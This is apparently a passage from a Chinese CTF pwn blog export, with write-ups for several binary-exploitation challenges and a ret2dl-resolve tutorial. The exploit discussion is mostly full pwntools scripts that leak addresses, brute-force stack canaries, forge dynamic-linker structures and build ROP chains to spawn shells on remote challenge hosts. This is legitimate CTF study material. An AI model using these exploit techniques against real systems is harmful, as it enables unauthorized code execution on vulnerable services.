code.ljust(0xec,b&#x27;a&#x27;)sh.sendline(code)\n利用任意地址读泄漏environ的值得到栈地址，然后第三阶段利用pop_r进行任意地址写改写栈，pop rsp ; ret到到我们布置的ROP中执行。\n#stage 3code = b&#x27;a&#x27;*0x8 + push_r(1) #leak stack_addr highcode += print_sp_value()#set regs ptrcode += input_sp()code += push(-0x10b4//4) + store_into_mem()code += input_sp()code += push(-0x10b4//4+1) + store_into_mem()#edit pop_r&#x27;s return addresscode += push(rop_addr &amp; 0xffffffff)code += pop_r(2)code += push(rop_addr &gt;&gt; 32)code += pop_r(3)code += push(pop_rsp &amp; 0xffffffff)code += pop_r(0)code += push(pop_rsp &gt;&gt; 32)code += pop_r(1)code += jmp(1000)\n完整的EXP如下\n#coding:utf8from pwn import *context.log_level = &#x27;debug&#x27;LOCAL = Falseelf = ELF(&#x27;./prpr&#x27;)if LOCAL:   sh = process(&#x27;./prpr&#x27;)   libc = ELF(&#x27;./libc-2.39.so&#x27;)   #sh = process(&#x27;./prpr&#x27;,env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./hook_printf.so&#x27;&#125;)else:   sh = remote(&#x27;8.147.129.74&#x27;,38943)   libc = ELF(&#x27;./libc-2.39.so&#x27;)def and_content(and_key,size,content):   sh.sendline(&#x27;1&#x27;)   sh.sendline(str(and_key))   sh.sendline(&#x27;%d&#x27; % (size / 4))   sh.send(content)def and_content_seq(and_key,size,content):   sh.sendline(&#x27;2&#x27;)   sh.sendline(str(and_key))   sh.sendline(&#x27;%d&#x27; % (size // 4))   for i in range(size//4+1):      sh.sendline(str(ord(content[i])))def xor_content(xor_key,size,content):   sh.sendline(&#x27;3&#x27;)   sh.sendline(str(xor_key))   sh.sendline(&#x27;%d&#x27; % (size / 4))   sh.send(content)def xor_content_seq(xor_key,size,content):   sh.sendline(&#x27;4&#x27;)   sh.sendline(str(xor_key))   sh.sendline(&#x27;%d&#x27; % (size // 4))   for i in range(size//4+1):      sh.sendline(str(ord(content[i])))def or_content(or_key,size,content):   sh.sendline(&#x27;5&#x27;)   sh.sendline(str(or_key))   sh.sendline(&#x27;%d&#x27; % (size / 4))   sh.send(content)def or_content_seq(or_key,size,data):   sh.sendline(&#x27;6&#x27;)   sh.sendline(str(or_key))   sh.sendline(&#x27;%d&#x27; % (size // 4))   for i in range(size//4+1):      sh.sendline(data)def push(x):   if x &lt; 0:      x = x + 0x100000000   return b&#x27;%U&#x27;.ljust(8,b&#x27;\\x00&#x27;) + p32(x)def load_into_stack():   return b&#x27;%#V&#x27;.ljust(8,b&#x27;\\x00&#x27;) + p32(0)def store_into_mem():   return b&#x27;%#X&#x27;.ljust(8,b&#x27;\\x00&#x27;) + p32(0)def print_sp_value():   return b&#x27;%y&#x27;.ljust(8,b&#x27;\\x00&#x27;) + p32(0)def call(x):   if x &lt; 0:      x = x + 0x100000000   return b&#x27;%g&#x27;.ljust(8,b&#x27;\\x00&#x27;) + p32(x)def jmp(x):   if x &lt; 0:      x = x + 0x100000000   return b&#x27;%N&#x27;.ljust(8,b&#x27;\\x00&#x27;) + p32(x)def input_sp():   return b&#x27;%a&#x27;.ljust(8,b&#x27;\\x00&#x27;) + p32(0)def read_mem():   return b&#x27;%c&#x27;.ljust(8,b&#x27;\\x00&#x27;) + p32(0)def print_mem():   return b&#x27;%b&#x27;.ljust(8,b&#x27;\\x00&#x27;) + p32(0)def retn():   return b&#x27;%n&#x27;.ljust(8,b&#x27;\\x00&#x27;) + p32(0)def push_r(idx):   return b&#x27;%k&#x27;.ljust(8,b&#x27;\\x00&#x27;) + p32(idx)def pop_r(idx):   return b&#x27;%Y&#x27;.ljust(8,b&#x27;\\x00&#x27;) + p32(idx)code = b&#x27;a&#x27;*0x8#set mem_idx = 0code += call(int(-0x65cc/12+1)) #mem_idx++#leak code heap addrcode += push(-0x10c4//4) + load_into_stack()code += print_sp_value()code += push(-0x10c4//4+1) + load_into_stack()code += print_sp_value()#leak elf_baseif LOCAL:   print_mem_ptr_off = -0x19D4 #localelse:   print_mem_ptr_off = -0x15C4 #remotecode += push(print_mem_ptr_off//4) + load_into_stack()code += print_sp_value()code += push(print_mem_ptr_off//4+1) + load_into_stack()code += print_sp_value()code += input_sp()#leak free_got addresscode += input_sp()code += load_into_stack()code += print_sp_value()#read stage2 code into mem[0] and execcode += push(0xec) + read_mem()code += jmp(int(-0x65cc/12+3))code = code.ljust(0xfc,b&#x27;a&#x27;)payload = b&#x27;&#x27;for x in code:   payload += p8(x ^ 0x68)sh.recvuntil(&#x27;___&#x27;)or_content_seq(0xfe,0xfc,&#x27;-1&#x27;)#return to 50xor_content(0x68,0xfc,payload)#move pc to run our code#raw_input()sh.sendline(str(-0x65cc/12))sh.recvuntil(&#x27;aaaaaaaa%g\\n&#x27;)heap_addr = (int(sh.recvuntil(&#x27;\\n&#x27;,drop = True)) &amp; 0xffffffff) | ((int(sh.recvuntil(&#x27;\\n&#x27;,drop = True)) &amp; 0xffffffff) &lt;&lt; 32)elf_base = ((int(sh.recvuntil(&#x27;\\n&#x27;,drop = True)) &amp; 0xffffffff) | ((int(sh.recvuntil(&#x27;\\n&#x27;,drop = True)) &amp; 0xffffffff) &lt;&lt; 32)) - 0x2750free_got_addr = elf_base + elf.got[&#x27;free&#x27;]memory_base = heap_addr - 0x65CCprint(&#x27;heap_addr=&#x27;,hex(heap_addr))print(&#x27;memory_base=&#x27;,hex(memory_base))print(&#x27;elf_base=&#x27;,hex(elf_base))#raw_input()sh.sendline(str((free_got_addr - memory_base)//4))free_addr_low = int(sh.recvuntil(&#x27;\\n&#x27;,drop = True)) &amp; 0xffffffffprint(&#x27;free_addr_low=&#x27;,hex(free_addr_low))#stage 2code = b&#x27;a&#x27;*0x8code += push(0xfc) + read_mem()code += retn()#stage2 startcode += input_sp()code += load_into_stack()code += print_sp_value()code += call(int(-0x65cc/12)) #read rop into mem[1]code += input_sp()code += push(-0x10b4//4) + store_into_mem()code += input_sp()code += push(-0x10b4//4+1) + store_into_mem()code += push_r(0) #leak stack_addrcode += print_sp_value()&#x27;&#x27;&#x27;code += push_r(1) #leak stack_addrcode += print_sp_value()&#x27;&#x27;&#x27;#read stage3 code into mem[0] and execcode += push(0xd4) + read_mem()code += jmp(int(-0x65cc/12))code = code.ljust(0xec,b&#x27;a&#x27;)sh.sendline(code)#sleep(1)raw_input()sh.sendline(str((free_got_addr - memory_base)//4+1))free_addr = free_addr_low | ((int(sh.recvuntil(&#x27;\\n&#x27;,drop = True)) &amp; 0xffffffff) &lt;&lt; 32)libc_base = free_addr - libc.sym[&#x27;free&#x27;]open_addr = libc_base + libc.sym[&#x27;open&#x27;]read_addr = libc_base + libc.sym[&#x27;read&#x27;]write_addr = libc_base + libc.sym[&#x27;write&#x27;]gets_addr = libc_base + libc.sym[&#x27;gets&#x27;]puts_addr = libc_base + libc.sym[&#x27;puts&#x27;]environ_addr = libc_base + libc.sym[&#x27;environ&#x27;]syscall = libc_base + 0x11BA5Fpop_rax = libc_base + 0x00000000000dd237pop_rsp = libc_base + 0x000000000003c058pop_rdi = libc_base + 0x000000000010f75b#pop rsi ; add eax, 0x2685c ; retpop_rsi = libc_base + 0x00000000001afc86mov_edx = libc_base + 0x00000000000f9de8print(&#x27;free_addr=&#x27;,hex(free_addr))print(&#x27;libc_base=&#x27;,hex(libc_base))#roprop_addr = heap_addr - 0x64c8flag_addr = heap_addr - 0x6440 + 8rop = p64(pop_rdi) + p64(flag_addr) + p64(pop_rsi) + p64(0) + p64(pop_rax) + p64(2) + p64(syscall)rop += p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(flag_addr) + p64(mov_edx) + p64(read_addr)rop += p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(flag_addr) + p64(write_addr)rop += b&#x27;./flag\\x00&#x27;sh.sendline(rop)print(&#x27;edit regs ptr&#x27;)raw_input()def pack_int(x):   if x &amp; 0x80000000 != 0:      x -= 0x100000000   return str(x)sh.sendline(pack_int(environ_addr &amp; 0xffffffff))sh.sendline(pack_int(environ_addr &gt;&gt; 32))#leak stack addressstack_addr_low = (int(sh.recvuntil(&#x27;\\n&#x27;,drop = True)) &amp; 0xffffffff)#stage 3code = b&#x27;a&#x27;*0x8 + push_r(1) #leak stack_addr highcode += print_sp_value()#set regs ptrcode += input_sp()code += push(-0x10b4//4) + store_into_mem()code += input_sp()code += push(-0x10b4//4+1) + store_into_mem()#edit pop_r&#x27;s return addresscode += push(rop_addr &amp; 0xffffffff)code += pop_r(2)code += push(rop_addr &gt;&gt; 32)code += pop_r(3)code += push(pop_rsp &amp; 0xffffffff)code += pop_r(0)code += push(pop_rsp &gt;&gt; 32)code += pop_r(1)code += jmp(1000)#code += push_r(0) #leak stack_addr#code += print_sp_value()code = code.ljust(0xd4,b&#x27;a&#x27;)sh.sendline(code)stack_addr = stack_addr_low | ((int(sh.recvuntil(&#x27;\\n&#x27;,drop = True)) &amp; 0xffffffff) &lt;&lt; 32)print(&#x27;stack_addr=&#x27;,hex(stack_addr))raw_input()if LOCAL:   run_func_return_stack = stack_addr - 0x2610else:   run_func_return_stack = stack_addr - 0x2610sh.sendline(pack_int(run_func_return_stack &amp; 0xffffffff))sh.sendline(pack_int(run_func_return_stack &gt;&gt; 32))sh.interactive()\n","categories":["CTF"],"tags":["ROP","变量覆盖","解释器/简易虚拟机"]},{"title":"rctf2018_rnote4(堆与dl_load相结合)","url":"/2020/06/10/rctf2018_rnote4/","content":"首先，检查一下程序的保护机制,无RELRO保护，无PIE保护\n\n\n然后，我们用IDA分析一下，edit功能里可以自由控制长度，存在溢出\n\n\n整个程序**[没有任何的输出]{.mark}**\n通过堆溢出，我们可以轻松构造任意地址写，但是没有输出函数，不能泄露地址，由此，想到了一个巧妙的方法，这个程序没有开启RELRO保护，那么其dt_strtab是可以修改的\n\n\n那么，我们只要在这里，将strtab表指针改成我们伪造的字符串表，然后，将某函数的got修改为其对应的plt load地址，当接下来调用该函数时，就可以将该函数解析为我们在字符串表里指定函数名的函数地址，这原理就是ret2dl的原理。在这里，我们将free函数解析为system函数，然后拿shell\n#coding:utf8from pwn import *#sh = process(&#x27;./RNote4&#x27;)sh = remote(&#x27;node3.buuoj.cn&#x27;,28637)elf = ELF(&#x27;./RNote4&#x27;)free_got = elf.got[&#x27;free&#x27;]free_got_ld = 0x0000000000400626#在NO relro的情况下伪造dynstr即可解析任意函数fake_dynstr_addr = 0x00000000006020D0 + 0x100fake_dynstr = &#x27;\\x00&#x27;*0x5F + &#x27;system\\x00&#x27;fake_dynstr = fake_dynstr.ljust(0x73,&#x27;\\x00&#x27;)fake_dynstr += &#x27;GLIBC_2.4\\x00GLIBC_2.2.5\\x00&#x27;dt_strtab = 0x0000000000601EB0def add(size,content):   sh.send(p8(1))   sh.send(p8(size))   sh.send(content)def edit(index,size,content):   sh.send(p8(2))   sh.send(p8(index))   sh.send(p8(size))   sh.send(content)def delete(index):   sh.send(p8(3))   sh.send(p8(index))add(0x20,&#x27;a&#x27;*0x20) #0add(0x80,&#x27;b&#x27;*0x80) #1add(0x20,&#x27;/bin/sh\\x00&#x27;.ljust(0x20,&#x27;\\x00&#x27;)) #2payload = &#x27;a&#x27;*0x20 + p64(0) + p64(0x21) + p64(0x80) + p64(fake_dynstr_addr)edit(0,0x40,payload)#伪造dynstredit(1,len(fake_dynstr),fake_dynstr)payload = &#x27;a&#x27;*0x20 + p64(0) + p64(0x21) + p64(0x80) + p64(dt_strtab)edit(0,0x40,payload)#修改dynstr指针edit(1,0x8,p64(fake_dynstr_addr))payload = &#x27;a&#x27;*0x20 + p64(0) + p64(0x21) + p64(0x80) + p64(free_got)edit(0,0x40,payload)#修改dynstr指针edit(1,0x8,p64(free_got_ld))#getshelldelete(2)sh.interactive()","categories":["CTF"],"tags":["堆溢出","ret2dl","dl_resolve"]},{"title":"rec_33c3_2016(堆栈不平衡导致漏洞利用)","url":"/2020/06/10/rec_33c3_2016/","content":"首先，检查一下程序的保护机制\n\n\n然后，我们用IDA分析一下，功能1可以用于栈数据泄露，轻松得到glibc地址\n\n\n功能5有一个函数指针，当输入为0时，其值未初始化\n\n\n因此，只要能控制其指针在栈里对应的数据，就可以执行任意代码。但是sign函数的栈太低，不能依靠其他函数直接来控制，这里在IDA的伪代码里看不出来，就直接看汇编。\n\n\n在polish函数中，此处存在栈不平衡的问题\n\n\n在call之前，开辟了0x10的空间，而call回来后仅仅add esp,8，栈降低了8字节。这点在伪代码里是看不出来的。\n也就是在S求和的过程中，每循环一次，esp就会降低8字节\n\n\n然后通过push就可以往栈里写数据\n\n\n由此，我们就可以在sign函数对应的位置布置下函数指针的值\n#coding:utf8from pwn import *from LibcSearcher import *#sh = process(&#x27;./rec_33c3_2016&#x27;,env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc-2.23_1.so&#x27;&#125;)sh = remote(&#x27;node3.buuoj.cn&#x27;,25620)libc = ELF(&#x27;./libc-2.23_1.so&#x27;)def show():   sh.sendlineafter(&#x27;&gt;&#x27;,&#x27;1&#x27;)   sh.recvuntil(&#x27;Your note: &#x27;)def do_sum(data):   sh.sendlineafter(&#x27;&gt;&#x27;,&#x27;2&#x27;)   sh.sendlineafter(&#x27;Operator:&#x27;,&#x27;S&#x27;)   for x in data:      sh.sendlineafter(&#x27;Operand:&#x27;,str(x))   sh.sendlineafter(&#x27;Operand:&#x27;,&#x27;.&#x27;)def getShell():   sh.sendlineafter(&#x27;&gt;&#x27;,&#x27;5&#x27;)   sh.sendline(&#x27;0&#x27;)show()sh.recv(8)_IO_2_1_stdout_addr = u32(sh.recv(4))libc_base = _IO_2_1_stdout_addr - libc.sym[&#x27;_IO_2_1_stdout_&#x27;]system_addr = libc_base + libc.sym[&#x27;system&#x27;]binsh_addr = libc_base + libc.search(&#x27;/bin/sh&#x27;).next()print &#x27;libc_base=&#x27;,hex(libc_base)print &#x27;system_addr=&#x27;,hex(system_addr)print &#x27;binsh_addr=&#x27;,hex(binsh_addr)data = []for i in range(0x63):   data.append(i)data.append(system_addr - 0x100000000)data.append(binsh_addr - 0x100000000)#利用push将数据写入栈里do_sum(data)#getshellgetShell()sh.interactive()","categories":["CTF"],"tags":["ROP","栈不平衡"]},{"title":"Redbud(canary爆破)","url":"/2020/02/17/redbud/","content":"首先，检查一下程序的保护机制\n\n\n然后，我们用IDA分析一下\n\n\n在程序的主功能函数里，存在一个明显的栈溢出，由于没有开启PIE，我们很容易做ROP。并且这是一个服务器程序，通过fork子进程来处理我们的请求，因此canary的值我们可以逐字节爆破。因为只要父进程没有重新启动，canary的值就不会变化，这题和cnss那题是一个道理。\n那么，我们直接上exp脚本\n#coding:utf8  from pwn import *  from LibcSearcher import *    context.log_level = &#x27;critical&#x27;  elf = ELF(&#x27;./redbud&#x27;)  write_got = elf.got[&#x27;write&#x27;]  csu_pop = 0x403F6A  csu_call = 0x403F50  pop_rdi = 0x403F73  #pop rsi;pop r15;ret  pop_rsi = 0x403F71  #socket建立的文件描述符  fd = 4    def init_connection():     global sh     #sh = remote(&#x27;127.0.0.1&#x27;,1337)     sh = remote(&#x27;111.198.29.45&#x27;,32664)  def stackoverflow(payload):     sh.send(&#x27;RPCM&#x27;)     sh.send(p32(len(payload) + 12,endian = &#x27;big&#x27;))     sh.send(p32(4,endian = &#x27;big&#x27;))     sh.send(payload)    init_connection()  #爆破canary  canary = &#x27;&#x27;  while len(canary) &lt; 8:     for x in range(0xFF):        init_connection()        stackoverflow(&#x27;a&#x27;*0x1008 + canary + p8(x))        try:           sh.recvuntil(&#x27;RPCN&#x27;)           sh.recv(8)        except:           sh.close()           continue        canary += p8(x)        print &#x27;canary=&#x27;,canary        break;    canary = u64(canary)  print &#x27;canary=&#x27;,hex(canary)  rop = p64(csu_pop)  #rbx,rbp  rop += p64(0) + p64(1)  #r12  rop += p64(write_got)  #r13 r14 r15  rop += p64(0x8) + p64(write_got) + p64(fd)  rop += p64(csu_call)  payload = &#x27;a&#x27;*0x1008 + p64(canary) + &#x27;a&#x27;*0x28 + rop  init_connection()  stackoverflow(payload)  #泄露write函数地址  write_addr = u64(sh.recv(8))  libc = LibcSearcher(&#x27;write&#x27;,write_addr)  libc_base = write_addr - libc.dump(&#x27;write&#x27;)  system_addr = libc_base + libc.dump(&#x27;system&#x27;)  dup2_addr = libc_base + libc.dump(&#x27;dup2&#x27;)  binsh_addr = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)  print &#x27;libc_base=&#x27;,hex(libc_base)  print &#x27;system_addr=&#x27;,hex(system_addr)  print &#x27;binsh_addr=&#x27;,hex(binsh_addr)    #getshell  #dup2(fd,0)  rop = p64(pop_rdi) + p64(fd) + p64(pop_rsi) + p64(0) * 2 + p64(dup2_addr)  #dup2(fd,1)  rop += p64(pop_rdi) + p64(fd) + p64(pop_rsi) + p64(1) * 2 + p64(dup2_addr)  #system(&#x27;/bin/sh&#x27;)  rop += p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)    payload = &#x27;a&#x27;*0x1008 + p64(canary) + &#x27;a&#x27;*0x28 + rop  init_connection()  stackoverflow(payload)      sh.interactive()  ","categories":["CTF"],"tags":["栈溢出","ROP","爆破"]},{"title":"ret2dl-runtime_resolve学习","url":"/2020/02/24/ret2dl-runtime_resolve/","content":"在linux下，二进制引用的外部符号加载方式有三种，FULL_RELRO、PARTIAL_RELRO、NO_RELRO，在PARTIAL_RELRO和NO_RELRO的情况下，外部符号的地址延迟加载，并且，在NO_RELRO下，ELF的dynamic段可读写。\nELF有plt表和got表，程序调用外部函数函数时，call的是plt表项，而plt表中，是这样的\n\n\nplt表里，取出了got表对应函数的地址，然后jmp到地址处。\n我们看看got表是什么样子的\n\n\n并**[没有指向read函数]{.mark}**，我们跟踪过去看看\n\n\nPush了一个数字，然后又jmp到了plt0处\n\n\n最终发现，先push了一个地址，然后跳到了第二个划线地址处\n\n\n跟踪进去看看\n\n\n其实这就是dl_runtime_resolve函数，我们运行完后，再观察got表\n\n\n其实就是dl_runtime_resolve接受两个参数，第一个是link_map，通过这个link_map，ld链接器可以访问到dynstr、dynamic、dynsym、rel.plt等所需要的数据地址，而第二个参数，则表明要解析的函数在符号表中是第几个，比如，在这个elf文件里，我们的read在第三个位置，因此push 2\n那么，dl_runtime_resolve是如何工作的呢？我们查看glibc的源码，看看\n它的源码在glibc&#x2F;sysdeps&#x2F;x86_64&#x2F;dl-trampoline.h，是直接用汇编写的，我们看到，dl_runtime_resolve简单的调用了_dl_fixup，因此，我们再去看看_dl_fixup的源码，它的源码在glibc&#x2F;elf&#x2F;dl-runtime.c\n#ifndef reloc_offset  # define reloc_offset reloc_arg  # define reloc_index  reloc_arg / sizeof (PLTREL)  #endif  DL_FIXUP_VALUE_TYPE  attribute_hidden __attribute ((noinline)) ARCH_FIXUP_ATTRIBUTE  _dl_fixup (  # ifdef ELF_MACHINE_RUNTIME_FIXUP_ARGS      ELF_MACHINE_RUNTIME_FIXUP_ARGS,  # endif      struct link_map *l, ElfW(Word) reloc_arg) &#123;      //获取symtab（存放dynsym的数组）      const ElfW(Sym) *const symtab          = (const void *) D_PTR (l, l_info[DT_SYMTAB]);      //获取strtab(存放符号名的数组)       const char *strtab = (const void *) D_PTR (l, l_info[DT_STRTAB]);      //获取reloc_arg对应的rel.plt项       const PLTREL *const reloc          = (const void *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);      //获取reloc_arg对应的dynsym       const ElfW(Sym) *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];      const ElfW(Sym) *refsym = sym;      //指向对应的got表，以便将解析结果写回去       void *const rel_addr = (void *)(l-&gt;l_addr + reloc-&gt;r_offset);      lookup_t result;      DL_FIXUP_VALUE_TYPE value;        /* Sanity check that we&#x27;re really looking at a PLT relocation.  */      assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);        /* Look up the target symbol.  If the normal lookup rules are not        used don&#x27;t look in the global scope.  */      if (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), 0) == 0) &#123;          const struct r_found_version *version = NULL;            if (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != NULL) &#123;              const ElfW(Half) *vernum =                  (const void *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);              ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; 0x7fff;              version = &amp;l-&gt;l_versions[ndx];              if (version-&gt;hash == 0)                  version = NULL;          &#125;            /* We need to keep the scope around so do some locking.  This is         not necessary for objects which cannot be unloaded or when          we are not using any threads (yet).  */          int flags = DL_LOOKUP_ADD_DEPENDENCY;          if (!RTLD_SINGLE_THREAD_P) &#123;              THREAD_GSCOPE_SET_FLAG ();              flags |= DL_LOOKUP_GSCOPE_LOCK;          &#125;    #ifdef RTLD_ENABLE_FOREIGN_CALL          RTLD_ENABLE_FOREIGN_CALL;  #endif          //根据符号名,搜索对应的函数，返回libc基地址，并将符号信息保存到sym中           result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,                                        version, ELF_RTYPE_CLASS_PLT, flags, NULL);            /* We are done with the global scope.  */          if (!RTLD_SINGLE_THREAD_P)              THREAD_GSCOPE_RESET_FLAG ();    #ifdef RTLD_FINALIZE_FOREIGN_CALL          RTLD_FINALIZE_FOREIGN_CALL;  #endif            //得到结果           value = DL_FIXUP_MAKE_VALUE (result,                                       sym ? (LOOKUP_VALUE_ADDRESS (result)                                              + sym-&gt;st_value) : 0);      &#125; else &#123;          /* We already found the symbol.  The module (and therefore its load         address) is also known.  */          value = DL_FIXUP_MAKE_VALUE (l, l-&gt;l_addr + sym-&gt;st_value);          result = l;      &#125;        /* And now perhaps the relocation addend.  */      value = elf_machine_plt_value (l, reloc, value);        if (sym != NULL              &amp;&amp; __builtin_expect (ELFW(ST_TYPE) (sym-&gt;st_info) == STT_GNU_IFUNC, 0))          value = elf_ifunc_invoke (DL_FIXUP_VALUE_ADDR (value));        /* Finally, fix up the plt itself.  */      if (__glibc_unlikely (GLRO(dl_bind_not)))          return value;      //将结果写回到got表中       return elf_machine_fixup_plt (l, result, refsym, sym, reloc, rel_addr, value);  &#125;  \n\n阅读上面源代码，我们知道了，解析时是根据符号名字符串来解析函数的，如果我们能够控制符号名字符串，那么，我们就可以实现解析任何函数，从而达到无需泄露来得到想要的函数。\n我们写一个简单的程序来说明ret2dl-resolve技术，现在，我们有以下程序\nret2dl-solv.c\n#include &lt;unistd.h&gt;  #include &lt;string.h&gt;  void fun()&#123;      char buffer[0x20];      read(0,buffer,0x200);  &#125;  int main()&#123;      fun();      return 0;  &#125;  \n\n先看在NO_RELRO下的情况先分析32位情况\n//编译  //gcc ret2dl-solv.c -z norelro -no-pie -fno-stack-protector -m32 -o ret2dlsolve2  \n\n在NO_RELRO情况下，因为dynamic可以修改，因此，我们直接修改dynamic的strtab，将它指向我们可控的区域，然后在可控区域对应的位置布置下需要的函数的名字即可，即伪造\ndynstr。要注意对齐。\n\n\n\n\n我们利用read，在bss段布下假的dynstr，然后修改dynamic段里strtab地址，让它指向fake_dynstr，然后手动调用dl_runtime_resolve函数解析，即可得到我们需要的函数。\n我们的exp脚本如下\n#coding:utf8  #伪造dynstr完成无泄漏攻击，仅适用于NO RELRO  from pwn import *    sh = process(&#x27;./ret2dlsolve2&#x27;)  elf = ELF(&#x27;./ret2dlsolve2&#x27;)  read_plt = elf.plt[&#x27;read&#x27;]  #此处是用来加载read的地址的，当我们伪造了dynstr后，再调用这个，就能将read解析为我们需要的函数  read_plt_load = 0x80482C6  leave_ret = 0x8048375  pop_ebp = 0x80484cb  #攻击目标，我们要修改这里，让它指向fake_dynstr  target_addr = 0x80496B0 + 4  bss = 0x8049778  fake_dynstr = &#x27;\\x00libc.so.6\\x00_IO_stdin_used\\x00system\\x00&#x27;  #做栈转移，同时继续下一轮的read  payload = &#x27;a&#x27;*0x2C + p32(pop_ebp) + p32(bss + 0x800) + p32(read_plt) + p32(leave_ret) + p32(0) + p32(bss + 0x800) + p32(0x1000)  sh.sendline(payload)  #由于多个有参数的函数同时写到一个payload，是完成不了的，互相冲突,因此read_plt_load的参数也是target_addr，即system(target_addr)，因此  #我们在target_addr处使用shell注入，即;sh  rop = &#x27;AAAA&#x27; + p32(read_plt) + p32(read_plt_load) + p32(0) + p32(target_addr) + p32(0x100)  #将fake_dynstr布置在bss + 0x850处  payload2 = rop.ljust(0x50,&#x27;\\x00&#x27;) + fake_dynstr  sh.sendline(payload2)  #raw_input()  #修改dynamic里面的dynstr为fake_dynstr，同时后面的;sh是一个shell注入  sh.sendline(p32(bss+0x850) + &#x27;;sh&#x27;)  sh.interactive()  \n\n让我们再看看64位的情况\n//编译  //gcc ret2dl-solv.c -z norelro -no-pie -fno-stack-protector -o ret2dlsolve2_64  \n\n基本一致，只是要考虑栈环境，不然system调用不成功\n#coding:utf8  #关键是要解决堆栈平衡，不然system不会成功，因此，我们在第一次read时就事先把rop给输入进去了  from pwn import *    sh = process(&#x27;./ret2dlsolve2_64&#x27;)  elf = ELF(&#x27;./ret2dlsolve2_64&#x27;)  read_plt = elf.plt[&#x27;read&#x27;]  fun_addr = elf.sym[&#x27;fun&#x27;]  #我们攻击的目标，我们要在此处修改指向fake_dynstr  target_addr = 0x600768 + 8  #用于加载函数地址的函数，当我们伪造了dynstr后，再次调用即可加载我们需要的函数  plt0_load = 0x4003B0  #pop rdi;ret;  pop_rdi = 0x400553  #pop rsi ; pop r15 ; ret  pop_rsi = 0x400551  #伪造dynstr  fake_dynstr = &#x27;\\x00libc.so.6\\x00system\\x00&#x27;  bss = 0x6008F8  #第一次构造2个输入机会，分别输入伪造的字符串，伪造的字符串的地址，rop  rop = p64(pop_rdi) + p64(bss) + p64(plt0_load) + p64(0)  payload = rop.ljust(0x28,&#x27;\\x00&#x27;) + p64(pop_rdi) + p64(0) + p64(pop_rsi) + p64(bss) + p64(0) + p64(read_plt)  payload +=  p64(pop_rdi) + p64(0) + p64(pop_rsi) + p64(target_addr) + p64(0) + p64(read_plt)  payload += rop  sh.sendline(payload)  #发送伪造的字符串  payload2 = &#x27;/bin/sh&#x27;.ljust(0x10,&#x27;\\x00&#x27;) + fake_dynstr  sleep(1)  sh.sendline(payload2)  sleep(1)  #修改dynsym里的strtab为我们伪造的dynstr  sh.sendline(p64(bss + 0x10))    sh.interactive()  \n\n接下来，我们看看PARTIAL_RELRO的情况在PARTIAL_RELRO情况下，dynamic不可写，因此不再像上面那样简单的利用，我们需要伪造rel.plt。回过来看看源码\n\n\n在获取reloc时未检查下标越界，而符号名又是通过sym-&gt;st_name取得\n\n\n因此，我们在可控范围内同时伪造rel.plt、sym和dynstr，那么就能完成利用\n我们先来看看32位情况下\n//编译  //gcc ret2dl-solv.c -z lazy -no-pie -fno-stack-protector -m32 -o ret2dlsolve  \n\n各个数据结构，在源代码里查看对应的结构体，结合IDA调试现有的数据伪造即可\n先是伪造sym\ntypedef struct  &#123;    Elf32_Word    st_name; //符号名相对.dynstr起始的偏移    Elf32_Addr    st_value;    Elf32_Word    st_size;    unsigned char st_info; //对于导入符号，值为0x12    unsigned char st_other;    Elf32_Section st_shndx;  &#125;Elf32_Sym;  \n\n\n\n我们可以参照IDA调试里现有的来改\n#开始伪造dynsym  fake_dynsym = p32(system_str - dynstr_addr)+p32(0)+p32(0)+p8(0x12)+p8(0)+p16(0)  \n\n然后我们伪造rel.plt\ntypedef struct  &#123;    Elf32_Addr    r_offset; //指向GOT表的指针    Elf32_Word    r_info;    //导入符号的信息，r_info = (index) &lt;&lt; 8 + 0x7  &#125; Elf32_Rel;  \n\n\n\n同样可以参照IDA调试里现有的来改\n#开始伪造rel.plt  fake_rel = p32(read_got) + p32((((fake_dynsym_addr - dynsym_addr) / 16) &lt;&lt; 8) + 0x7)  \n\n伪造后，我们调用dl_runtime_resolve函数时的第二个参数设置为reloc_arg&#x3D;fake_rel_addr - rel_addr，这样就能解析出我们指定的函数了。\n#coding:utf8  #重要，基于dl-runtime的免泄露地址，解析任意函数，实现任意函数的调用  #适用于Partial RELRO和NO RELRO  from pwn import *    sh = process(&#x27;ret2dlsolve&#x27;)  elf = ELF(&#x27;ret2dlsolve&#x27;)  read_got = elf.got[&#x27;read&#x27;]  read_plt = elf.plt[&#x27;read&#x27;]  leave_ret = 0x8048395  pop_ebp = 0x80484eb    #真正的dynstr的起始位置  dynstr_addr = 0x804821C  #真正的dynsym的起始地址  dynsym_addr = 0x80481CC  #真正的rel.plt的起始位置  rel_addr = 0x8048298  #调用dll_runtime_resolve处  plt0 = 0x80482D0  #bss段开始的位置  bss = 0x804A01C    #我们准备布置system字符串到bss+0x900处  system_str = bss + 0x900  #接下来布置/bin/sh字符串  binsh_str = system_str + len(&#x27;system&#x27;) + 1  #接下来布置fake_dynsym  fake_dynsym_addr = bss + 0x910  #开始伪造dynsym  fake_dynsym = p32(system_str - dynstr_addr)+p32(0)+p32(0)+p8(0x12)+p8(0)+p16(0)  #接下来布置fake_rel  fake_rel_addr = fake_dynsym_addr + len(fake_dynsym)  #开始伪造rel.plt  fake_rel = p32(read_got) + p32((((fake_dynsym_addr - dynsym_addr) / 16) &lt;&lt; 8) + 0x7)  #我们做栈迁移，同时继续调用read，向bss+0x800处写数据，注意，因为栈是从高往低增长，因此我们预留了0x800的空间  #需要注意的是，预留的空间要尽可能大一点，保证dll_runtime_resolve的栈空间够用,不然不能成功，这个问题搞了好久  payload1 = &#x27;a&#x27;*0x2C + p32(pop_ebp) + p32(bss + 0x800) + p32(read_plt) + p32(leave_ret) + p32(0) + p32(bss + 0x800) + p32(0x1000)  #第一次，我们做栈迁移，同时继续调用read读取下一轮数据  sh.sendline(payload1)  